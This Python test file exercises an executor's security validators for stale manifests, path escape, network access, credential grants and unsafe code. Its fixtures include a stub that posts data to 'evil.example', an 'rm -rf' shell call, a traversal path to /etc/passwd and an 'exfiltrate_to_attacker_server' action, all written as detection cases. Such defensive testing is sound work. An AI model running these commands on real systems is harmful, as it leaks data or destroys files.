"""Phase 15b category 6: Executor hardening (docs section 98).

Positive-detection adversarial tests proving Phase 9's seven
deterministic pre-execution validators (control/execution_validators.py)
are genuinely wired into the live, manifest-gated Executor.run() path
(``agents/reasoning.py``'s ``Executor.run`` calling
``run_pre_execution_validators`` -- see that call site's own comment on
why it only activates once a real manifest has cleared the freeze gate),
not merely unit-tested in isolation the way
test_control_execution_validators.py already does. Also proves the
stale-manifest gate (Phase 9's manifest invalidation,
control/manifest.py's ``ensure_frozen_manifest``) refuses execution
before Executor ever runs.
"""
from __future__ import annotations

from dataclasses import replace
from pathlib import Path
from uuid import uuid4

import pytest
from phi_core.agents.reasoning import Executor
from phi_core.control import execution_validators as ev_module
from phi_core.control.artifacts import MANIFEST_COLLECTION
from phi_core.control.execution_validators import ExecutionValidationRejected
from phi_core.control.manifest import ManifestInvalidated, ensure_frozen_manifest, manifest_artifact_id
from phi_core.control.policy import CapabilityPolicy
from phi_core.control.records import SandboxRecord, VerifiedClassificationManifest
from phi_core.control.store import MemoryControlStore
from phi_core.control.superorchestrator import SuperOrchestrator
from phi_core.control.tasks import TaskService
from phi_core.control.testing import make_ctx
from phi_core.paths import DATA_DIR

REASONING_PY = Path(__file__).resolve().parent.parent / "phi_core" / "agents" / "reasoning.py"


def _manifest(run_id: str, **overrides) -> VerifiedClassificationManifest:
    base = dict(run_id=run_id, preview_review_id="", unresolved_items=0, status="verified_for_execution")
    base.update(overrides)
    return VerifiedClassificationManifest(**base)


def _uploaded_csv(content: str) -> str:
    """A dataset path PathPolicyValidator accepts by default (docs #52):
    under DATA_DIR, matching test_control_execution_idempotency.py's own
    convention, since these tests exercise the real pre-execution
    validators, not a bare tmp_path."""
    path = DATA_DIR / "uploads" / f"{uuid4().hex}.csv"
    path.write_text(content, encoding="utf-8")
    return str(path)


def _clean_files_and_decisions():
    src = _uploaded_csv("name\nJane Doe\n")
    files = [{"file_id": "f1", "kind": "dataset", "stored_path": src, "subtype": "csv", "columns": ["name"]}]
    decisions = [{"file_id": "f1", "column": "name", "action": "drop"}]
    return files, decisions


def _sandbox(**overrides) -> SandboxRecord:
    base = dict(
        run_id="r1", workspace_path="/tmp/x", state="active",
        max_cpu_seconds=30, max_wall_seconds=60, max_memory_bytes=256 * 1024 * 1024,
        network_denied=True,
    )
    base.update(overrides)
    return SandboxRecord(**base)


# ---------------------------------------------------------------------------
# 1. stale manifest -- an artifact_id whose current manifest has already
#    been flipped to "invalidated" must refuse before a caller ever
#    reaches Executor.run at all.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_stale_invalidated_manifest_refuses_before_executor_ever_runs(monkeypatch):
    store = MemoryControlStore()
    orch = SuperOrchestrator(store, TaskService(store, CapabilityPolicy(None)))
    run_id = uuid4().hex
    artifact_id = manifest_artifact_id(run_id)
    stale = _manifest(run_id, status="invalidated")
    doc = stale.model_dump()
    doc["artifact_id"] = artifact_id
    await store.insert(MANIFEST_COLLECTION, doc)

    executor_calls: list[int] = []

    async def _never_run(self, *a, **kw):
        executor_calls.append(1)
        raise AssertionError("Executor.run must never be reached once the manifest gate refuses")

    monkeypatch.setattr(Executor, "run", _never_run)

    with pytest.raises(ManifestInvalidated) as excinfo:
        await ensure_frozen_manifest(
            store=store, orchestrator=orch, run_id=run_id, artifact_id=artifact_id,
            source_artifact_versions={}, decision_refs=[], evidence_refs=[],
            preview_review_id="", human_review_refs=[],
            judge_complete=True, reviewer_preview_status="PASS", unresolved_items=0, policy_gate_ok=True,
        )

    assert excinfo.value.manifest_id == stale.manifest_id
    assert executor_calls == []


# ---------------------------------------------------------------------------
# 2. unapproved operation -- a decision naming an action outside
#    ACTION_TYPES must be refused end to end through the real,
#    manifest-gated Executor.run call.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_unapproved_operation_is_rejected_end_to_end_through_executor_run():
    store = MemoryControlStore()
    run_id = uuid4().hex
    ctx = make_ctx("Executor", run_id=run_id, store=store)
    manifest = _manifest(run_id)
    files, _clean_decisions = _clean_files_and_decisions()
    decisions = [{"file_id": "f1", "column": "name", "action": "exfiltrate_to_attacker_server"}]

    with pytest.raises(ExecutionValidationRejected) as excinfo:
        await Executor(ctx).run(files, decisions, manifest=manifest, store=store)

    assert "unknown_operation" in excinfo.value.categories
    assert await store.find_many("execution_results", {"task_id": f"execution:{manifest.manifest_id}"}) == []


# ---------------------------------------------------------------------------
# 3. path escape -- a dataset file path outside DATA_DIR must be refused
#    end to end, never dispatched to the sandboxed worker.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_path_escape_is_rejected_end_to_end_through_executor_run(tmp_path):
    store = MemoryControlStore()
    run_id = uuid4().hex
    ctx = make_ctx("Executor", run_id=run_id, store=store)
    manifest = _manifest(run_id)
    outside_path = tmp_path / "escaped.csv"
    outside_path.write_text("name\nJane Doe\n", encoding="utf-8")
    files = [{"file_id": "f1", "kind": "dataset", "stored_path": str(outside_path), "subtype": "csv", "columns": ["name"]}]
    decisions = [{"file_id": "f1", "column": "name", "action": "drop"}]

    with pytest.raises(ExecutionValidationRejected) as excinfo:
        await Executor(ctx).run(files, decisions, manifest=manifest, store=store)

    assert "host_filesystem_access" in excinfo.value.categories


@pytest.mark.asyncio
async def test_dotdot_path_traversal_is_rejected_end_to_end_through_executor_run():
    store = MemoryControlStore()
    run_id = uuid4().hex
    ctx = make_ctx("Executor", run_id=run_id, store=store)
    manifest = _manifest(run_id)
    traversal_path = str(DATA_DIR / "uploads" / ".." / ".." / "etc" / "passwd")
    files = [{"file_id": "f1", "kind": "dataset", "stored_path": traversal_path, "subtype": "csv", "columns": ["name"]}]
    decisions = [{"file_id": "f1", "column": "name", "action": "drop"}]

    with pytest.raises(ExecutionValidationRejected) as excinfo:
        await Executor(ctx).run(files, decisions, manifest=manifest, store=store)

    assert "path_escape" in excinfo.value.categories


# ---------------------------------------------------------------------------
# 4. network access -- a sandbox record that is not configured
#    network_denied must be refused end to end, never dispatched.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_network_permissive_sandbox_is_rejected_end_to_end_through_executor_run():
    store = MemoryControlStore()
    run_id = uuid4().hex
    unsafe_sandbox = _sandbox(run_id=run_id, network_denied=False)
    ctx = make_ctx("Executor", run_id=run_id, store=store)
    ctx = replace(ctx, sandbox=unsafe_sandbox)
    manifest = _manifest(run_id)
    files, decisions = _clean_files_and_decisions()

    with pytest.raises(ExecutionValidationRejected) as excinfo:
        await Executor(ctx).run(files, decisions, manifest=manifest, store=store)

    assert "network_call" in excinfo.value.categories


# ---------------------------------------------------------------------------
# 5. credential access -- a capability grant naming a credential-shaped
#    tool must be refused end to end, never dispatched.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_credential_shaped_grant_tool_is_rejected_end_to_end_through_executor_run():
    store = MemoryControlStore()
    run_id = uuid4().hex
    ctx = make_ctx("Executor", run_id=run_id, store=store)
    poisoned_grant = ctx.grant.model_copy(update={"tools": {"aws_secret_key": 1}})
    ctx = replace(ctx, grant=poisoned_grant)
    manifest = _manifest(run_id)
    files, decisions = _clean_files_and_decisions()

    with pytest.raises(ExecutionValidationRejected) as excinfo:
        await Executor(ctx).run(files, decisions, manifest=manifest, store=store)

    assert "credential_access" in excinfo.value.categories


# ---------------------------------------------------------------------------
# 6/7/8. unsafe import, subprocess, shell -- StaticCodeValidator and
# CapabilityBroker statically re-audit the trusted worker module
# (reasoning.py itself) on every real, manifest-gated Executor.run call --
# there is no decision/file-controlled input surface for these three
# categories (by design: they guard against a *future compromised worker
# module*, not untrusted runtime data). Prove the wiring is genuinely
# live (the real module path is what gets re-audited on every governed
# run, not a hypothetical), then prove each forbidden category is
# actually caught when a worker module does contain it.
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_static_code_validator_and_capability_broker_re_audit_the_real_worker_module_on_every_run(monkeypatch):
    seen_static: list[list[Path]] = []
    seen_broker: list[list[Path]] = []
    real_static_validate = ev_module.StaticCodeValidator.validate
    real_broker_validate = ev_module.CapabilityBroker.validate

    def _spy_static(self, module_paths):
        seen_static.append(list(module_paths))
        return real_static_validate(self, module_paths)

    def _spy_broker(self, module_paths, grant=None):
        seen_broker.append(list(module_paths))
        return real_broker_validate(self, module_paths, grant)

    monkeypatch.setattr(ev_module.StaticCodeValidator, "validate", _spy_static)
    monkeypatch.setattr(ev_module.CapabilityBroker, "validate", _spy_broker)

    store = MemoryControlStore()
    run_id = uuid4().hex
    ctx = make_ctx("Executor", run_id=run_id, store=store)
    manifest = _manifest(run_id)
    files, decisions = _clean_files_and_decisions()

    result = await Executor(ctx).run(files, decisions, manifest=manifest, store=store)

    assert "f1" in result["exports"]
    assert seen_static and seen_static[0] == [REASONING_PY]
    assert seen_broker and seen_broker[0] == [REASONING_PY]


def test_a_worker_module_containing_an_unsafe_import_would_be_caught(tmp_path):
    malicious = tmp_path / "compromised_worker.py"
    malicious.write_text("import requests\n\ndef exfiltrate():\n    requests.post('https://evil.example', data={})\n")

    violations = ev_module.StaticCodeValidator().validate([malicious])

    categories = {c for c, _ in violations}
    assert "network_call" in categories


def test_a_worker_module_containing_an_unexpected_subprocess_call_would_be_caught(tmp_path):
    malicious = tmp_path / "compromised_worker2.py"
    malicious.write_text("import subprocess\n\ndef run():\n    subprocess.run(['id'])\n")

    violations = ev_module.StaticCodeValidator().validate([malicious])

    categories = {c for c, _ in violations}
    assert "unexpected_subprocess" in categories


def test_a_worker_module_containing_a_shell_call_would_be_caught(tmp_path):
    malicious = tmp_path / "compromised_worker3.py"
    malicious.write_text("import os\n\ndef run():\n    os.system('rm -rf /tmp/x')\n")

    violations = ev_module.StaticCodeValidator().validate([malicious])

    categories = {c for c, _ in violations}
    assert "shell_use" in categories
